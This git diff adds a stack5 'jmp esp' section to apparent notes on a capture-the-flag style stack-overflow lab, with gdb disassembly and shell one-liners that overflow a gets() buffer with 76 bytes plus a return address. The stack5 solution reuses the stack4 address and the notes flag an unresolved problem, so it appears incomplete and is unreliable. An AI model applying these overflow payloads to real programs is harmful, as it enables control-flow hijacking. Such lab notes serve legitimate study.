@@ -14,6 +14,8 @@
     - [stack3 solution](#stack3-solution)
   - [stack4: modify EIP](#stack4-modify-eip)
     - [stack4 solution](#stack4-solution)
+  - [stack5: jmp esp](#stack5-jmp-esp)
+    - [stack5 solution](#stack5-solution)
 
 ## stack0
 
@@ -152,3 +154,50 @@ r <<< $(python3 -c "print('A' * (64 + int(0xb + 0x4)))"|xargs echo -en;echo -en 
 ```sh
 ./stack4 <<< $(python3 -c "print('A' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
 ```
+
+## stack5: jmp esp
+
+```asm
+(gdb) disassemble main
+Dump of assembler code for function main:
+  0x080483c4 <+0>:     push   ebp
+  0x080483c5 <+1>:     mov    ebp,esp
+  0x080483c7 <+3>:     and    esp,0xfffffff0
+  0x080483ca <+6>:     sub    esp,0x50
+  0x080483cd <+9>:     lea    eax,[esp+0x10]
+  0x080483d1 <+13>:    mov    DWORD PTR [esp],eax
+  0x080483d4 <+16>:    call   0x80482e8 <gets@plt>
+  0x080483d9 <+21>:    leave
+  0x080483da <+22>:    ret
+End of assembler dump.
+```
+
+- info:
+  + `leave` === `# mov esp, ebp -> pop ebp`. The `pop ebp` means esp += 4
+  + `ret` esp += 4 again, and `eip <- [esp]`, which is the so-called `JMP esp`
+
+```gdb
+b *main + 21
+info proc mappings
+   # start      end           size        offset objfile
+   # 0xffbf2000 0xffc13000    0x21000        0x0 [stack]
+./stack5 <<< $(python3 -c "print('A' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
+
+   # objdump -d ./stack5
+   # 080483c4 <main>
+
+   # leave                  esp=0xfff34180 ebp=0xfff341d8 -> esp=0xfff341dc
+     # (gdb) x/4wx $esp
+     # 0xfff341dc:     0xf7d0ff21      0x00000001      0xfff34274      0xfff3427c 
+   # ret
+     # eip=0xf7d0ff21
+r <<< $(python3 -c "print('A' * 76 )"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
+```
+
+### stack5 solution
+
+```sh
+./stack5 <<< $(python3 -c "print('A' * 76 )"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
+```
+
+- A problem: to `jmp esp`, `ebp` must be overwritten (modern system stack cookie)
